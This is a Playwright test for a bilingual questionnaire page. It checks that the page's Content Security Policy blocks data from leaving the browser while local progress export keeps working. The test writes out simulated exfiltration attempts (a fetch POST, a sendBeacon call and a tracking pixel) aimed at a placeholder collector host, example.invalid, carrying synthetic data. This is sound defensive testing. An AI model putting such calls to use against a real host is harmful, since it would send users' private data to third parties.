import { expect, test } from "@playwright/test";

test("private bilingual trial refuses network exfiltration and keeps local export working", async ({ page }) => {
  // Route a fake, non-existent collector. Even on the vulnerable page no
  // content leaves the test browser or reaches a third-party server.
  const outbound = [];
  await page.route("https://example.invalid/**", async route => {
    outbound.push({ url: route.request().url(), method: route.request().method() });
    await route.fulfill({ status: 204 });
  });
  await page.goto("/the-community-lab/questionnaire/?season=2");
  await page.locator(".full-choice").first().click();
  const result = await page.evaluate(async () => {
    const fetchSucceeded = await fetch("https://example.invalid/collector", {
      method: "POST", body: "SYNTHETIC_NOT_A_PERSON",
    }).then(() => true, () => false);
    const beaconAccepted = navigator.sendBeacon(
      "https://example.invalid/beacon", "SYNTHETIC_NOT_A_PERSON",
    );
    const pixelLoaded = await new Promise(resolve => {
      const pixel = new Image();
      pixel.onload = () => resolve(true);
      pixel.onerror = () => resolve(false);
      pixel.src = "https://example.invalid/pixel";
    });
    return { fetchSucceeded, beaconAccepted, pixelLoaded };
  });
  expect(result.fetchSucceeded).toBe(false);
  expect(result.pixelLoaded).toBe(false);
  // sendBeacon() may report that data was queued even when CSP blocks dispatch.
  // Only the intercepted network log proves that nothing was actually sent.
  expect(typeof result.beaconAccepted).toBe("boolean");
  expect(outbound, "CSP must stop attempted exfiltration before network dispatch").toEqual([]);

  const [download] = await Promise.all([
    page.waitForEvent("download"),
    page.locator("#full-save").click(),
  ]);
  expect(download.suggestedFilename()).toBe("community-private-season-2-progress.json");
  await expect(page.locator("#full-confirm-progress-backup")).toBeVisible();
});
